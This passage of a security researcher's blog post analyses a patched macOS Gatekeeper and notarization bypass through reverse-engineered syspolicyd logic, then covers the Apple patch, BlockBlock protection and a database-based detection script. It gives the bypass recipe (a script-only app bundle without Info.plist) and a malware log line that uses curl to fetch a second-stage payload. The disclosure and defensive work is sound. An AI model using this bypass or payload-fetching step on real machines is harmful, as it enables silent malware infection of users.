to\nthe\n```\n\"evaluateScanResult:withEvaluationArguments:withPolicy:withEvaluationType:withCodeEval:\"\n\n```\nmethod.\n\nThe\n```\nevaluateScanResult:withEvaluationArguments:withPolicy:withEvaluationType:withCodeEval:\n\n```\nmethod is rather massive (having over 200 control flow blocks). Triaging its log message strings and\nnames of methods it invokes, we can see it is the arbiter, the final decision maker, on whether or not a\nprompt will be shown to the user. For example:\n\n\n-----\n\n```\n  ([ p ese t o ptO ype a _ 0 opt o s a _C8 co p et o a ] 0 0) {\n2 \n3  ...\n4  rax = os_log_impl(__mh_execute_header, rbx, 0x0, \n5     \"Prompt shown (%ld, %#lx), waiting for response: %@\", &var_70, 0x20);\n6  \n7  dispatch_semaphore_wait(*(var_1A0 + 0x28), 0xffffffffffffffff);\n8}\n\n```\n‚Ä¶and then handling the user‚Äôs response to the alert, for example displaying the following message if the\nuser clicks deny:\n```\n1if (*(var_170 + 0x18) != 0x2) goto userBlocked;\n2\n3userBlocked:\n4if (os_log_type_enabled(rax, 0x0) != 0x0) {\n5  var_70 = 0x0;\n6  rax = _os_log_impl(__mh_execute_header, rbx, 0x0, \"Blocking executable due to user not\nallowing\", &var_70, 0x2);\n7}\n\n```\nThe actual prompt is displayed by the CoreServicesUIAgent. Bidirectional communications between\nsyspolicyd and this agent occur via XPC.\n\nIn the case of our proof of concept, no alert is shown. Hence such logic is apparently skipped! Let‚Äôs see\nhow.\n\nThe evaluation type (set to the problematic value of 0x2, as the policy engine failed to correctly identify our\nPoC application as a bundle) is passed in as the sixth argument ( withEvaluationType: ). The\ndisassembly notes this is then moved into a local variable (which we named `evalType ). As we`\npreviously noted this first passed to the `GK evaluateScanResult: %lu string, which for our PoC`\ngenerated `GK evaluateScanResult: 2, PST: (path:`\n```\n/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id: (null)),\n(bundle_id: NOT_A_BUNDLE), 1, 0, 1, 0, 7, 0\n\n```\nThe first time it is explicitly checked is in an `if statement, which specifically checks if it was set to 0x2:`\n```\n1if (evalType != 0x2) goto notTwo;\n\n```\n‚Ä¶as the `evalType for our proof of concept application was set to 0x2, we don‚Äôt take this jump, but`\ncontinue on.\n\nNext, it checks if the evaluee matches known malware (via a call to a method named\n```\nxProtectResultIsBlocked ). Of course our PoC does not, so onwards we go. Though there are several\n\n```\nother checks, they all appear spurious, but regardless all logic related to showing an alert or prompt to the\nuser is skipped. This bears repeating! Normal `syspolicyd will send an XPC message to the`\n```\nCoreServicesUIAgent in order to alert the user that the application is disallowed (for example if it s\n\n```\nnon-notarized), or even if signed and notarized a prompt requesting that the user explicitly approve the\napplication. Here, all such logic is skipped, and no prompts or alerts are thus shown!\n\nBefore the `evaluateScanResult:withEvaluationArguments:withPolicy: methods returns, it`\nexecutes some code that explicitly sets the `R12 register to` `0x1 (true). This is relevant as later this`\nvalue is passed into the `EvalutionResult object‚Äôs setAllowed‚Äô method:`\n\n\n-----\n\n```\n ;t ue\n2r12 = 0x1; \n3...\n4\n5[evalResult setAllowed:sign_extend_64(r12)];\n\n```\nThis is the confirmation that the policy engine is indeed allowing our unsigned, unnotarized proof of\nconcept application!\n\nIn a debugger we can introspect this `EvalutionResult object, which (as its name implies) represents`\nthe system‚Äôs policy evaluation result of our `PoC.app :`\n\nFirst note that before the call to `setAllowed, all numeric values in the object are 0 (false):`\n```\n(lldb) po [$rdi className]\nEvaluationResult\n(lldb) po $rdi\nEvalResult: 0,0,0,0 - /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC\n\n```\nAfter the call to `setAllowed (and to` `setCacheResult ), the` `EvaluationResult object is updated:`\n```\n(lldb) po [$rdi className]\nEvaluationResult\n(lldb) po $rdi\nEvalResult: 1,1,0,0 - /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC\n(lldb) p (BOOL)[$rdi allowed]\n(BOOL) $83 = YES\n(lldb) p (BOOL)[$rdi wouldPrompt]\n(BOOL) $82 = NO\n(lldb) p (BOOL)[$rdi didPrompt]\n(BOOL) $84 = NO\n(lldb) po [$rdi evaluationTargetPath]\n/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC\n\n```\nNote that the `allowed instance variable is set to 1 (YES/true), while` `wouldPrompt and` `didPrompt`\nare both set to 0 (NO/false) ‚Ä¶as a result the system decided that no prompt was needed!\n\nOnce the evaluation has completed (though no prompt was shown), the completion block (initial pass to\nthe `evaluateCodeForUser:withPID:withProcessPath: ... withCompletionCallback: method) is`\ninvoked.\n\nThe completion callback block first invokes the `EvaluationResult ‚Äôs` `allowed method to see if the the`\nevaluation was allowed.\n```\n1if ([rax allowed] != 0x0) goto wasAllowed;\n\n```\nNote that if evaluation resulted in not allowed, the following code path is taken, which (as expected)\nterminates the suspended process:\n\n\n-----\n\n```\n // ot a o ed og c\n2\n3...\n4os_log_error_impl(__mh_execute_header, rsi, 0x10, \"Terminating process due to Gatekeeper\nrejection: %d, %@\", &var_20, 0x12);\n5\n6terminate_with_reason(*(int32_t *)(r13 + 0x48), 0x9, 0x8, \"Gatekeeper policy blocked execution\",\n0x41);\n\n```\nFor example, running the ‚Äúnormal‚Äù script-based application ( Script.app ) which is blocked, triggers this\ncall after the alert is shown:\n```\n(lldb) \nProcess 138 stopped\n-> 0x10595b514 : callq 0x1059adc84  ; symbol stub for: terminate_with_reason\n(lldb) po $rdi\n7938\n(lldb) x/s $rcx\n0x1059c4b4c: \"Gatekeeper policy blocked execution\"\n\n```\nIn the above debugger output, the first argument ( 7938 passed in via the `RDI register), is the process`\nid for the process to terminated. For example, the `Script.app (albeit run via` `/bin/sh ):`\n```\n% ps -p 7938\nPID CMD\n7938 /bin/sh /private/var/folders/pw/sv96s36d0qgc_6jh45jqmrmr0000gn/T/AppTranslocation/3FF7B408AC64-4636-AA06-89E059307032/d/Script.app/Contents/MacOS/Script\n\n```\nHowever, as our proof of concept was allowed(!), we take the jump, and invoke the\n```\nExecManagerService ‚Äôs sendEvaluationResult:forEvaluationID: passing in the\nEvaluationResult object and an evaluation ID (in this instance the value is 599).\n\n```\nInterestingly, the `sendEvaluationResult:forEvaluationID: calls into the kernel via an`\n```\nIOConnectCallMethod call!\n\n```\nStepping over this the `IOConnectCallMethod calls results in two things`\n\n1. The suspended process under evaluation (e.g. our proof of concept application) is resumed.\n2. The following messages are logged:\n```\n   kernel: (AppleSystemPolicy) Waking up reference: 599\n   kernel: (AppleSystemPolicy) Thread waiting on reference 599 woke up\n   kernel: (AppleSystemPolicy) evaluation result: 599, allowed, cache, 1618125792\n\n```\nThe log messages contain the evaluation ID (599), and indicate the suspended evaluee process (main\nthread?) was woken up and allowed (to resume). This means our PoC is finally free to merrily go on its\nway!\n\nThe kernel extension (kext) that generates these log messages is `AppleSystemPolicy.kext . As noted`\nby Scott Knight, this is ‚Äúthe ‚Ä¶client of the `syspolicyd MIG service‚Äù. In other words, it interacts w/`\n```\nsyspolicyd for example waiting on evaluations and resuming (allowed) processes.\n\n```\n\n-----\n\nLooking for cross-references to such log messages as well as dumping symbols and method names\nprovides insight into `AppleSystemPolicy.kext`\n```\n% nm -C /System/Library/Extensions/AppleSystemPolicy.kext/Contents/MacOS/AppleSystemPolicy\nWAITING_ON_APPROVAL_FROM_SYSPOLICYD__(syspolicyd_evaluation*)\nREVOKED_PROCESS_WAITING_ON_TERMINATION__(lck_mtx_t*)\nAppleSystemPolicy::waitForEvaluation(syspolicyd_evaluation*, int, ASPEvaluationInfo*, vnode**,\nScanMeta*, ...);\nAppleSystemPolicy::procNotifyExecComplete(proc*);\nASPEvaluationManager::waitOnEvaluation(syspolicyd_evaluation*);\nASPEvaluationManager::wakeupEvaluationByID(long long, syspolicyd_evaluation_results*);\n\n```\nFurther discussion of this kext is outside the scope of the blog post (and is not relevant to the underlying\nbug).\n\nFor more information on the AppleSystemPolicy kext, see:\n\n[\"syspolicyd internals\".](https://knight.sc/reverse%20engineering/2019/02/20/syspolicyd-internals.html)\n\n## A Recap\n\nIf you‚Äôve made it this far, kudos! Spelunking through macOS‚Äôs system policy engine is no easy task!\nBefore we dive into in-the wild exploitation, and protections & detections, let‚Äôs briefly recap the bug. In a\nsentence:\n\nAny script-based application that does not contain an `Info.plist file will be misclassified as ‚Äúnot a`\nbundle‚Äù and thus will be allowed to execute with no alerts nor prompts.\n\nLet‚Äôs break this down piece by piece:\n\n1. A script-based application is an application whose main executable component is a\n\n(bash/python/etc) script. It is imperative that it is a script, for several reasons. First, if the main\nexecutable component is a mach-O binary unless it is fully notarized, it will (still) be rejected\n(blocked) by the system, as mach-O binaries are always checked. And even if the mach-O binary is\nnotarized it will result in the File Quarantine, ‚Äú‚Ä¶is an application ‚Ä¶are you sure you want to open it‚Äù\nprompt.\n\nA script-based application is executed (as we saw) via the shell, `/bin/sh which is a trusted, platform`\nbinary. Normally though script-based applications are also blocked (unless the entire bundle is signed and\nnotarized). However due to the bug this is not the case, meaning the script‚Äôs contents (commands) are\nallowed.\n\n1. An application that does not contain an `Info.plist file. This is similarly imperative as even`\n\n‚Äúnormal‚Äù script-based applications are subjected to policy checks. If a script-based application\ncontains an `Info.plist file, it will be (correctly) classified as a bundle, and as such will be`\nblocked (unless the entire bundle is signed and notarized). And even in the case when it is signed\nand notarized, a File Quarantine prompt will be shown that requires explicit user approval.\n\n2. A script-based application without an `Info.plist file will be misclassified as ‚Äúnot a bundle‚Äù. This`\n\nresults in an evaluation type of 0x2, which causes logic in the system policy engine to both skip\nshowing any prompts or alerts and explicitly setting an allowed flag to true.\n\n\n-----\n\nEnd result, such an application, though unsigned, unnotarized, and quarantined, is allowed to execute\nwithout a single alert! ÔøΩ\n\n## In the Wild\n\n[With a solid understanding of the flaw, I reached out to my good friends at Jamf, and simply inquired if](https://www.jamf.com/?utm_source=objective-see&utm_medium=sponsored-link&utm_campaign=next-gen-security&utm_content=2021-02-05_protect)\nthey had seen any script-based malware packaged up in application bundles. While we‚Äôve seen malware\nin the past shipped as scripts in normal application bundles (i.e. with an `Info.plist file) I was skeptical`\nwe‚Äôd find any exploiting this specific flaw.\n\nJamf (via their [Jamf Protect product), already flags script-based malware that‚Äôs packaged up in an](https://www.jamf.com/?utm_source=objective-see&utm_medium=sponsored-link&utm_campaign=next-gen-security&utm_content=2021-02-05_protect)\napplication bundles, simply, as we noted, such malware (in normal application bundles) is rather\ncommon.\n\n[Well, turns out they were able to confirm via Jamf Protect there was a new variant of malware that was](https://www.jamf.com/?utm_source=objective-see&utm_medium=sponsored-link&utm_campaign=next-gen-security&utm_content=2021-02-05_protect)\nuniquely packaged as a bare-boned script based application.\"\n\n\n-----\n\n-----\n\nA bare-boned script-based application, found it the wild!\nIn other words, there‚Äôs malware exploiting this exact flaw ‚Ä¶as an 0day ‚Ä¶in the wild. Yikes!\n\nYou can read more about the discovery and analysis of malware in their excellent writeup:\n\n[\"Shlayer Malware Abusing Gatekeeper Bypass On Macos\"](https://www.jamf.com/blog/shlayer-malware-abusing-gatekeeper-bypass-on-macos/)\nAs shown below, though unsigned (and unnotarized) the malware ( 1302.app/Contents/MacOS/1302 ) is\nable to run (and download & execute 2nd-stage payloads), bypassing all File Quarantine, Gatekeeper,\nand Notarization requirements:\n```\n# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty\n...\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"arguments\" : [\n   \"/bin/bash\",\n   \"/private/var/folders/zg/lhlpqsq14lz_ddcq3vx0r5xm0000gn/T\n    /AppTranslocation/E486DA04-D4EC-41C4-8250-F587586DA4F7/d\n    /1302.app/Contents/MacOS/1302\"\n  ],\n  \"name\" : \"bash\",\n  \"pid\" : 770\n }\n}\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"arguments\" : [\n   \"curl\",\n   \"-L\",\n   \"https://bbuseruploads.s3.amazonaws.com/\n    c237a8d2-0423-4819-8ddf-492e6852c6f7/downloads/\n    c9a2dac9-382a-42f6-873b-8bf8d5beafe5/d9o\"\n  ],\n  \"ppid\" : 884,\n  \"name\" : \"curl\",\n  \"pid\" : 885\n }\n}\n\n```\nOnce off and running, the malware can manually remove the quarantine attribute from any subsequent\npayloads or components it downloads. Thus, such items will not be subjected to the aforementioned\nsecurity checks (notarization, etc.).\n\nLuckily as discussed below, [BlockBlock with ‚ÄúNotarized Mode‚Äù enabled, generically blocks this threat:](https://www.objective-see.com/products/blockblock.html)\n\n\n-----\n\n-----\n\nBlockBlock, block blocking!\n\n## The Patch\n\nApple fixed this bug in macOS 11.3. How? Well recall that the core flaw is in the misclassification of a\nbare-boned script-based application as ‚Äúnot a bundle‚Äù. As normal script-based application (i.e. ones with\nan `Info.plist file) are classified as a bundle, and trigger the correct alerting/prompting/blocking logic,`\nit seemed reasonable to assume that Apple would address the flaw simply in the bundle classification\nlogic.\n\n‚Ä¶and this appears to be exactly the case.\n\nThough the bundle classification logic is located in an unnamed subroutine, it‚Äôs trivial to locate it in the\nnew macOS 11.3 `syspolicyd binary. We simply look for cross-references to unique strings (e.g.`\n```\nVersions/Current/Resources/Info.plist ) that are found in the unnamed subroutine in the 11.2\n\n```\nversion of `syspolicyd .`\n\nOnce we locate the ‚Äúsame‚Äù subroutine in 11.3, we first notice it has been greatly expanded. In fact, the\nnumber of code blocks (that indicate control flow decisions) has expanded from 26 up to 35. Clearly,\nadditional checks were added. Though we won‚Äôt comprehensively deconstruct the entire (updated)\nalgorithm, via static analysis, we can point out some relevant new checks that are responsible for (now)\ncorrectly classifying even applications that don‚Äôt have `Info.plist files!`\n\nFirst (and most significantly) there is now a check for a path extension of `.app ‚Ä¶and any item with said`\nextension, will now be correctly classified as a bundle:\n```\n1pathExtension = [[component pathExtension] lowercaseString];\n2isBundle = [rax isEqualToString:@\"app\"];\n\n```\nThis is important, as this is essentially the only check Finder performs when kicking off the launch of an\napplication. (Recall we created a folder named `foo.app double-clicked it, and observed Finder`\nattempting to launch it).\n\nAlso, even if the item does not contain a path component of `.app, the new code now checks for`\npresence of `Contents/MacOS :`\n```\n1bundle = [component URLByAppendingPathComponent:@\"Contents/MacOS\"];\n2isBundle = doesFileExist(bundle.path);\n\n```\nMy guess is macOS likely requires (any, even non-application) bundles to conform to this structure for\nfunctionality reasons. This is makes sense that the ‚Äúis a bundle‚Äù classification algorithm also now checks\nfor structure as well.\n\nThe improved algorithm now correctly classifies our bare-bones script-based PoC application as a bundle.\nThis means it‚Äôs now subjected to code paths within `syspolicyd that will both display an alert to the user`\nas well as block the application from running (as it is not notarized).\n\n(correctly) blocked on macOS 11.3\nWas this all that was required? It appears so, as a (very) brief triage of other logic within the `syspolicyd`\ncode, did not reveal any notable changes.\n\n## Protections:\n\n\n-----\n\nFirst and foremost the best way to patch against this nasty bug and protect oneself from malware that is\ncurrently exploiting it, is to update to macOS 11.3. Like now! Go do it!\n\n[Luckily, if you were running a recent version of BlockBlock (with ‚ÄúNotarization Mode‚Äù enabled), you were](https://www.objective-see.com/products/blockblock.html)\nalready protected! ÔøΩ\n\nVersion 2.0 of BlockBlock brought a host of improvements, such as native M1 compatibility. Most relevant\nin the context of today‚Äôs blog post though, was the introduction of ‚ÄúNotarization Mode‚Äù:\n\nBlockBlock's Preferences\n\n(including Notarization Mode)\n\n\n-----\n\nThe idea is simple: regardless of the system policy setting (or presence of bugs), BlockBlock examines\nlaunched processes (and scripts), and alerts on those that are not notarized. By design there are a few\ncaveats including the fact that BlockBlock only examines user-launched applications, that have been\ndownloaded from the Internet.\n\nLet‚Äôs delve into BlockBlock logic a bit more here:\n\n1. By means of the Endpoint Security Framework, BlockBlock registers an authentication callback\n\n( ES_EVENT_TYPE_AUTH_EXEC ) for any new processes:\n```\n 1//endpoint (process) client\n 2@property es_client_t* endpointProcessClient;\n 3\n 4...\n 5\n 6//events\n 7es_event_type_t procEvents[] = {ES_EVENT_TYPE_AUTH_EXEC};\n 8\n 9//new client\n10// callback will process `ES_EVENT_TYPE_AUTH_EXEC` events\n11es_new_client(&endpointProcessClient, ^(es_client_t *client, const es_message_t *message)\n12{\n13 //TODO process event\n14}\n15\n16//subscribe\n17es_subscribe(endpointProcessClient, procEvents, sizeof(events)/sizeof(procEvents[0]))\n\n```\n1. When a `ES_EVENT_TYPE_AUTH_EXEC event occurs (i.e. when a process has been launched, but`\n\nbefore it is allowed to execute), BlockBlock examines either the process, or if it‚Äôs a process\nexecuting a script (e.g. `/bin/sh ) the script. Specifically after confirming the item (process or script)`\nis running from a translocated location (which means it‚Äôs been quarantined, and launched by the\nuser), it checks if it‚Äôs been notarized.\n\nTo check if an item has been translocated, one can invoke the private\n```\nSecTranslocateIsTranslocatedURL API. Whereas to check if an item is notarized, invoke the\nSecStaticCodeCheckValidity API with a SecRequirementRef set to ‚Äúnotarized‚Äù:\n1SecStaticCodeRef staticCode = NULL;\n2static SecRequirementRef isNotarized = nil;\n3\n4SecStaticCodeCreateWithPath(itemPath, kSecCSDefaultFlags, &staticCode);\n5SecRequirementCreateWithString(CFSTR(\"notarized\"), kSecCSDefaultFlags, &isNotarized);\n6\n7SecStaticCodeCheckValidity(staticCode, kSecCSDefaultFlags, isNotarized);\n\n```\n1. If the item being launched is translocated and non-notarized, BlockBlock will alert the user, giving\n\nthem the option to confirm or allow. For example, here‚Äôs the detection and alert when attempting to\nrun our PoC application:\n\n\n-----\n\n-----\n\nBlockBlock, block blocking!\nIn the above alert, though macOS (inadvertently) will allow the script to run, BlockBlock has detected it is\nnon-notarized script, and thus should (likely) be blocked. Though of course, the user is given the option to\nallow.\n\n[To learn more about, or to install BlockBlock, hop over to its page: BlockBlock. It‚Äôs 100% free!](https://objective-see.com/products/blockblock.html)\n\n[BlockBlock is also fully open-source, so you can peruse its source code as well: Source Code.](https://github.com/objective-see/BlockBlock)\n\n## Detections\n\nI've written a proof of concept Python script to scan for (past) exploitation attempts:\n\n[scan.py](https://objective-see.com/downloads/blog/blog_0x64/scan.py)\nWhat about (past) detections?\n\nAs it appears that this bug has been around since macOS 10.15 (2019), I thought it might be interesting to\nexplore some ideas of detecting past abuses (‚Ä¶for example malware exploiting it in the wild).\n\nFirst, recall that we ran three different applications and analyzed their log messages as an initial step in\nattempting to (somewhat) pinpoint the bug‚Äôs location. For the PoC application (and only for the PoC\napplication), after its (Gatekeeper) evaluation, we saw the following log message:\n\n‚Äú syspolicyd: [com.apple.syspolicy.exec:default] Updating flags:\n```\n/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC, 512 ‚Äù\n\n```\nThis log message is printed as part of the code path that (inadvertently) allowed the unsigned, unnotarized\nPoC application:\n```\n1os_log_impl(__mh_execute_header, r15, 0x1, \"Updating flags: %@, %lu\", &var_70, 0x16);\n2   \n3\n4[*(var_E8 + 0x8) updateFlags:rbx forTarget:var_A0];\n\n```\nAs shown in the above code, immediately after the message is logged, `syspolicyd invokes a method`\nnamed `updateFlags: forTarget: .`\n\nThis method belongs to the `ExecManagerDatabase call, and is invoked with the flags and the`\n```\nPolicyScanTarget object representing the evaluee.\n\n```\nTriaging the `ExecManagerDatabase ‚Äôs` `updateFlags: forTarget: method reveals an SQL update`\nstatement: `@\"UPDATE policy_scan_cache SET flags = ?1 WHERE volume_uuid = ?2 AND`\n```\nobject_id = ?3 AND fs_type_name = ?4\";\n\n```\n‚Ä¶and a call into an `executeQuery: withBind: withResults method (that executes the SQL query`\nvia various `sqlite3_* APIs).`\n\nIn order to find out what database is updated we can run a file monitor such as macOS‚Äôs built-in\n```\nfs_usage utility:\n\n```\n\n-----\n\n```\n  s_usage esyste | g ep syspo cyd\n...\nRdData[S] D=0x052fdb4a B=0x1000 /dev/disk1s1\n/private/var/db/SystemPolicyConfiguration/ExecPolicy-wal syspolicyd.55183   \n# file /private/var/db/SystemPolicyConfiguration/ExecPolicy*\n/private/var/db/SystemPolicyConfiguration/ExecPolicy: SQLite 3.x database\n/private/var/db/SystemPolicyConfiguration/ExecPolicy-shm: data\n/private/var/db/SystemPolicyConfiguration/ExecPolicy-wal: SQLite Write-Ahead Log\n\n```\nThis reveals an aptly-named database being updated:\n\n```\n/private/var/db/SystemPolicyConfiguration/ExecPolicy\n\n```\n\nIf we take a peek at the undocumented `policy_scan_cache table in this` `ExecPolicy database, we`\ncan see evaluation results ‚Ä¶of many (every?) item that has been scanned!\n\n\n-----\n\n-----\n\nEvaluated items in the policy_scan_cache table\nUnfortunately the data in the `policy_scan_cache table does not contain the path to the evaluated item.`\nHowever, it turns out the `object_id column contains the inode of the item (on the volume identified in`\nthe `volume_uuid column).`\n\nWe can confirm this by looking for our `PoC.app . First, we get its inode (via the` `stat command):`\n```\n% stat ~/Downloads/PoC.app/Contents/MacOS/PoC \n16777220 121493800 ... /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC\n\n```\nArmed with its inode ( 121493800 ), let‚Äôs query the `ExecPolicy database:`\n```\n# sqlite3 ExecPolicy\nsqlite> .headers on\nsqlite> SELECT * FROM policy_scan_cache WHERE object_id = 121493800;\npk|volume_uuid|object_id|fs_type_name|bundle_id|cdhash|team_identifier|signing_identifier|policy_m\n15949|0612A910-2C3C-4B72-9C901ED71F3070C3|121493800|apfs|NOT_A_BUNDLE||||7|0|512|1618194723|1618194723|1618194723|4146150715079\n\n```\nPerfect, this confirms that the systems evaluation results of our PoC application was in fact logged to the\n```\nExecPolicy database.\n\n```\nLet‚Äôs now select all items that have similar values to what we saw in the logs, such as flags of `512 (we‚Äôll`\nalso add a few other constraints such as `NOT_A_BUNDLE ):`\n```\nSELECT * FROM policy_scan_cache WHERE flags = 512 AND bundle_id = 'NOT_A_BUNDLE' AND policy_match\n= 7; Result: 183 rows returned in 100ms \n\n```\n‚Ä¶still a lot. But many are simply legitimate utilities that you‚Äôve downloaded and approved on your system\n(and thus can be ignored). For example, on my box there is a row containing the `object_id (inode)`\nvalue of `23503887 . This maps to` `supraudit, an unsigned audit utility (created by J. Levin) that I had`\npreviously downloaded and manually approved/ran:\n```\n$ stat /usr/local/bin/supraudit\n16777220 23503887 /usr/local/bin/supraudit\n\n```\nArmed with this knowledge we can perhaps uncover successful exploitations of this bug in the following\nmanner:\n\n1. Enumerate the rows in the `policy_scan_cache table, filtering on ones that (the policy engine`\n\nthought were) not a bundle, have flag value of 0x200 (512).\n\n2. For each result, take its `volume_uuid and` `object_id value. The latter is really the item‚Äôs`\n\n(evaluee‚Äôs) inode number.\n\n\n-----\n\n3. Find the item on the matching volume, via this inode value. How? Well after reading Howard\n\n[Oakley‚Äôs ‚ÄúOpen Recent, inodes, and Bookmarks: How macOS remembers files‚Äù I learned the](https://eclecticlight.co/2018/03/05/open-recent-inodes-and-bookmarks-how-macos-remembers-files/)\n```\n  GetFileInfo utility (found in /usr/bin/ ) can, given a volume and file inode, return the file‚Äôs\n\n```\npath:\n\n```\nGetFileInfo /.vol/<volume inode>/<file inode>\n\n```\n\n4. In the `policy_scan_cache table we noted there are many legitimate applications and utilities (that`\n\nyou‚Äôve download and approved to run on your system). As such, we need to parse through each\nitem (that we‚Äôve found via its inode), to check if it‚Äôs a suspicious bare-bones script-based application.\nSpecifically we can look for a items with:\n\na. An `*.app in its path.`\n\nb. A `/Contents/MacOS/ subdirectory.`\n\nc. An item (within the `Contents/MacOS/ subdirectory) that matches the app‚Äôs name and is a script.`\n\nd. Does not contain an `Info.plist file.`\n\nFind such an item, you‚Äôve more than likely got a malicious item ‚Ä¶or at least one that you should take a\nvery close look at! üëÄ\n\nLet‚Äôs look at an example, using the malware that was exploiting this vulnerability as an 0day.\n\nAfter running the malware, we notice a new entry in the\n```\n/private/var/db/SystemPolicyConfiguration/ExecPolicy database:\n# sqlite3 /private/var/db/SystemPolicyConfiguration/ExecPolicy\nsqlite> SELECT * FROM policy_scan_cache WHERE flags = 512 AND bundle_id = 'NOT_A_BUNDLE' AND pk=\n(SELECT max(pk) FROM policy_scan_cache);\npk|volume_uuid|object_id|fs_type_name|bundle_id|cdhash|team_identifier|signing_identifier|policy_m\n77|0A81F3B1-51D9-3335-B3E3169C3640360D|12885173338|apfs|NOT_A_BUNDLE||||7|0|512|1618359929|1618359929|1618359929|41461507150\n\n```\nWe then extract the value of the `object_id,` `12885173338, (which recall is the file‚Äôs` `inode ), and use`\nthat to locate the file on disk.\n\n\n-----\n\n```\n get o u e s ode\n% stat /\n16777220 2 drwxr-xr-x 20 root wheel ...\n# get file's (inode: 12885173338) path\n% GetFileInfo /.vol/16777220/12885173338\nfile: \"/Users/user/Downloads/yWnBJLaF/1302.app\"\n...\n# its not signed\n% codesign -dvvv 1302.app\n1302.app: code object is not signed at all\n# is a bare-boned application bundle\n% find /Users/user/Downloads/yWnBJLaF/1302.app\n1302.app/Contents\n1302.app/Contents/MacOS\n1302.app/Contents/MacOS/1302\n# who's executable component, is a script\n% file 1302.app/Contents/MacOS/1302\n1302.app/Contents/MacOS/1302: Bourne-Again shell script executable (binary data)\n\n```\nNote that once the file has been located, (in the terminal output above) we confirm it‚Äôs an unsigned, bareboned (no `Info.plist ) script-based application! Clearly fits the profile of an item exploiting this bug.`\n\nTo automate the detection of such (potentially) malicious applications (on the main volume) I‚Äôve created a\nsimple Python script: `scan.py. This script programmatically queries the` `ExecPolicy database, then`\nprocesses the results in order to locate any script-based applications (without an `Info.plist file) that`\nhave been run\n```\n 1...\n 2\n 3query = \"SELECT * FROM policy_scan_cache WHERE volume_uuid = '\" + volUUID + \"' AND flags = 512\nAND bundle_id = 'NOT_A_BUNDLE'\"\n 4\n 5connection = sqlite3.connect(\"/private/var/db/SystemPolicyConfiguration/ExecPolicy\")\n 6items = execute_read_query(connection, query)\n 7\n 8#scan/parse all items\n 9# looking for file on main volume that\n10# a) is an app bundle\n11# b) is a script-based app bundle\n12# c) is a script-based app bundle, without an Info.plist file\n13for item in items:\n14  \n15 #get file path from vol & file inode\n16 fileURL = Foundation.NSURL.fileURLWithPath_('/.vol/' + str(volInode) + '/' + str(item[2]))\n17 result, file, error = fileURL.getResourceValue_forKey_error_(None, \"NSURLCanonicalPathKey\",\nNone)\n18\n19 ...\n\n```\n\n-----\n\n```\n pyt o sca py\nvolume inode: 16777220\nvolume uuid: 0A81F3B1-51D9-3335-B3E3-169C3640360D\nopened 'ExecPolicy' database\nextracted 183 evaluated items\npossible malicious application: /Users/user/Downloads/yWnBJLaF/1302.app\ndetected 1 possible malicious applications\n\n```\nIf the item (malware) is run off a disk image, the system will copy it off the .dmg to translocate the item\nbefore its evaluated. The entry in the database will therefore reference the translocated item.\nUnfortunately translocated items are automatically deleted by the system.\nAs such, the object_id (inode) may reference a file that no longer exists :/\n\n## Conclusions\n\nThe vast, vast, majority of macOS malware requires some user interaction (such as directly running the\nactual malicious code) in order to infect a macOS system. Unfortunately such macOS malware still\nabounds and everyday countless Mac users are infected.\n\nSince 2007, Apple has sought to protect users from inadvertently infecting themselves if they are tricked\ninto running such malicious code. This is a good thing as sure, users may be naive, but anybody can\nmake a mistakes. Moreover such protections (specifically notarization requirements) may now even\nprotect users from advanced supply-chain attacks ‚Ä¶and more!\n\nUnfortunately due to subtle logic flaw in macOS, such security mechanisms were proven fully and 100%\nmoot, and as such we‚Äôre basically back to square one ‚Ä¶(well, more precisely pre-2007). Yikes!\n\nIn this blog post, we started with an unsigned, unnotarized, script-based proof of concept application that\ncould trivially and reliably sidestep all of macOS‚Äôs relevant security mechanisms (File Quarantine,\nGatekeeper, and Notarization Requirements) ‚Ä¶even on a fully patched M1 macOS system. Armed with\nsuch a capability macOS malware authors could (and are) returning to their proven methods of targeting\nand infecting macOS users. Yikes again!\n\nThe core of the blog post dug deep into the policy internals of macOS, ultimately revealing a subtle logic\nflaw. A shown, this flaw can result in the misclassification of certain applications, and thus would cause the\npolicy engine to skip essential security logic such as alerting the user and blocking the untrusted\napplication.\n\nAfter reversing Apple‚Äôs update, we highlighted the patch, noting how the classification algorithm was\nimproved. This will now result in the correct classification of applications (as bundles), and ensure that\nuntrusted, unnotarized applications will (yet again) be blocked, and thus the user protected.\n\n\n-----\n\n(correctly) blocked on macOS 11.3\n\nFinally, we wrapped things up first with a brief discussion on protections, most notably highlighting the fact\nthat [BlockBlock already provides sufficient protections ‚Ä¶beating out Cupertino ;)](https://www.objective-see.com/products/blockblock.html)\n\n\n-----\n\nBlockBlock, block\n\nblocking!\nInterested in enterprise grade protection?\nAs noted, [Jamf Protect already contains detection logic for such threats, and thus was able to uncover](https://www.jamf.com/?utm_source=objective-see&utm_medium=sponsored-link&utm_campaign=next-gen-security&utm_content=2021-02-05_protect)\nmalware exploiting this flaw as a 0day!\n\nThen, we discussed a novel idea aimed at detecting attacks that exploit this flaw, by examining evaluation\nresults logged to the (undocumented) `ExecPolicy database.`\n\nTo end, a few thoughts‚Ä¶\n\n\n-----\n\nThough this bug is now patched, it clearly (yet again) illustrates that macOS is not impervious to incredible\n[shallow, yet hugely impactful flaws. How shallow? Well that fact that a legitimate developer tool (appify)](https://gist.github.com/mathiasbynens/674099)\nwould inadvertently trigger the bug is beyond laughable (and sad).\n\nAnd how impactful? Basically macOS security (in the context of evaluating user launched applications,\nwhich recall, accounts for the vast majority of macOS infections) was made wholly moot.\n\nGood thing there are free open-source security tools that can offer an extra (better?) layer of protection!\n\n[And maybe one day Apple will stop suing security companies, and instead focus solely on improving the](https://www.vice.com/en/article/3azzpj/corellium-says-its-just-like-a-playstation-emulator-apple-lawsuit)\nsecurity of their OS.\n‚Ä¶hey, we can all dream, right?!\n\n## üíï Support Me:\n\n[Love these blog posts? You can support them via my Patreon page!](https://www.patreon.com/bePatron?c=701171)\n\nThis website uses cookies to improve your experience.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
